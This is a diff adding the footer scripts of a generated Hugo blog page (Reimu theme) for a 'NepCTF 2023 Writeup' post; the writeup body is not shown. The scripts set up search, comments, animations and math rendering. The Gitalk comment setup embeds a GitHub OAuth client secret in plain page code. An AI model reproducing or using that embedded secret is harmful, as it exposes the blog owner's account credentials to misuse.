+    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script><script src="/js/main.js" ></script><script src="/js/aos.js" ></script><script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", aosInit);
+    } else {
+      aosInit();
+    }
+  </script><script src="/js/pjax_main.js" data-pjax></script><script>
+    var ALGOLIA_CONFIG = {
+      logo: '\/images\/algolia_logo.svg',
+      algolia: {
+        applicationID: "G5DS5ZI3YM",
+        apiKey: "90bf1b7c38d7240c582e5c8a29bff9ab",
+        indexName: "Blog",
+        hits: {
+          "per_page": parseInt("10")
+        },
+        labels: {
+          "input_placeholder": '搜索.....',
+          "hits_empty": '未发现与 「${query}」相关内容',
+          "hits_stats": '找到${hits}条结果（用时 ${time} ms）'
+        }
+      }
+    };
+  </script><script
+    src="https://npm.webcache.cn/algoliasearch@4.17.1/dist/algoliasearch-lite.umd.js"
+    deferintegrity="sha384-xvLS0jfKuoREs7pqkRI/OI8GcqohO5S&#43;jQz7ZBtQXnsXmD&#43;9jDOOY4cL6dCPzlrk" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/@reimujs/instantsearch.js@4.57.0-beta.1/dist/instantsearch.production.min.js"
+    deferintegrity="sha384-aagKMe8nkqaP2DYQc8kkYOL5l&#43;M5Q2WH/Uhr4teOh0Ybp0RZj0kUSDm45qPikMjK" crossorigin="anonymous"></script><script src="/js/algolia_search.js" ></script><script
+    src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js"
+    integrity="sha384-8LyaidD9GPxQQgLJO/WRw/O2h3BoNq/ApI/ecpvM6RsrCz2qP2ppBXUKihP4V/2d" crossorigin="anonymous"></script><script>
+  if (! false  || !window.matchMedia('(max-width: 768px)').matches) {
+    if (window.firework) {
+      const options = JSON.parse("{\"excludeelements\":[\"a\",\"button\"],\"particles\":[{\"colors\":[\"var(--red-1)\",\"var(--red-2)\",\"var(--red-3)\",\"var(--red-4)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"emit\"],\"number\":20,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.3,0.5],\"radius\":[16,32]}},{\"colors\":[\"var(--red-0)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"diffuse\"],\"number\":1,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.2,0.5],\"lineWidth\":6,\"radius\":20}}]}");
+      options.excludeElements = options.excludeelements;
+      delete options.excludeelements;
+      window.firework(options);
+    }
+  }
+</script>
+
+<div id="lazy-script">
+  <div><script data-pjax>
+        window.REIMU_POST = {
+          author: "Ya1orin",
+          title: "NepCTF 2023",
+          url: "http:\/\/localhost:1313\/post\/nepctf-2023\/",
+          description: "NepCTF 2023 Writeup",
+          cover: "http:\/\/localhost:1313\/images\/banner.webp",
+        };
+      </script><script src="/js/insert_highlight.js" data-pjax></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const initPswp = (gallery, children) => {
+          if (_$$(`${gallery} ${children}`).length > 0) {
+            new PhotoSwipeLightbox({
+              gallery,
+              children,pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+        }
+        const pswp = () => {
+          initPswp('.article-entry', 'a.article-gallery-item');
+          initPswp('.article-gallery', 'a.article-gallery-item');
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script><script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+  var commentConfigKeys = ['valine', 'waline', 'twikoo', 'gitalk', 'giscus'];
+  var commentConfig = {gitalk: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.gitalk-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        const script = loadScript(
+          'https:\/\/npm.webcache.cn\/gitalk@1.8.0\/dist\/gitalk.min.js',
+          !'webcache|gitalk@1.8.0\/dist\/gitalk.min.js'.startsWith('local') ? 'sha384-kspnZUWBoSWwoJHa0hBCXYbHGbhvU\/lcEH5O8eVbSDhbPwsiVUTp\/aGX\/z\/5EuMA' : undefined
+        );
+        script.onload = () => {
+          if ( false ) {
+            
+            const md5Script = loadScript(
+              'https:\/\/npm.webcache.cn\/blueimp-md5@2.19.0\/js\/md5.min.js',
+              !'webcache|blueimp-md5@2.19.0\/js\/md5.min.js'.startsWith('local') ? 'sha384-JmVtRz6RWiXnA14QbIOJzPuU3MidULOpBP66deeLLyyoF4Tr\/gZlbkHkL6vTthxH' : undefined
+            );
+            md5Script.onload = initGitalk;
+            document.head.appendChild(md5Script);
+          } else {
+            
+            initGitalk();
+          }
+        };
+        document.head.appendChild(script);
+
+        function initGitalk() {
+          let gitalk = new Gitalk({
+            clientID: 'Ov23li64Bz4egFDpBVAa',
+            clientSecret: 'ff0e7ea9d99ed40adbfcb4bf88ff2b95918d9dd7',
+            repo: 'Blog-comment',
+            owner: 'Ya1orin',
+            admin: JSON.parse("\"Ya1orin\""),
+            id: location.pathname,
+            distractionFreeMode: false,
+            language: document.documentElement.lang || 'en',
+          });
+          gitalk.render('gitalk-comment');
+        }
+      }
+    },};
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig?.[key]?.enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    
+    if (!defaultComment) {
+      var configDefault = 'gitalk';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig?.[sys]?.enable) || '';
+    }
+  }
+
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      
+      const commentType = item.getAttribute('data-selector');
+
+      
+      hideAllComments();
+
+      
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          
+          changeActiveCommentItems(item);
+        });
+      }
+
+      
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script><script
+    src="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.js"
+    data-pjaxintegrity="sha384-MWNUH0WmtsYGhn2cbH6ELRCbf9LG3QDqCC&#43;gqPB3IBNO35xjZK3Ejb6oONRpDbPg" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/katex@0.16.24/dist/contrib/auto-render.min.js"
+    data-pjaxintegrity="sha384-hCXGrW6PitJEwbkoStFjeJxv&#43;fSOOQKOPbJxSfM6G5sWZjAyWhXiTIIAmQqnlLlh" crossorigin="anonymous"></script><script data-pjax>
+          var renderMath = () => {
+            if (!window.renderMathInElement) return;
+            window.renderMathInElement(_$("article"), {
+              delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "\\[", right: "\\]", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+              ],
+            });
+          };
+          if (document.readyState === "loading") {
+            document.addEventListener("DOMContentLoaded", renderMath, { once: true });
+          } else {
+            renderMath();
+          }
+        </script></div>
+</div><script
+    src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js"
+    asyncintegrity="sha384-0M75wtSkhjIInv4coYlaJU83&#43;OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id&#43;S" crossorigin="anonymous"></script><script>
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.getRegistrations().then((registrations) => {
+        for (let registration of registrations) {
+          registration.unregister();
+        }
+      });
+    }
+  </script><script>
+  const reimuCopyright = String.raw`
+   ______     ______     __     __    __     __  __    
+  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                    
+  `;
+  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
+  console.log(
+    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
+    "color: white; background: #ff5252; padding:5px 0;",
+    "padding:4px;border:1px solid #ff5252;",
+  );
+</script></body>
+</html>
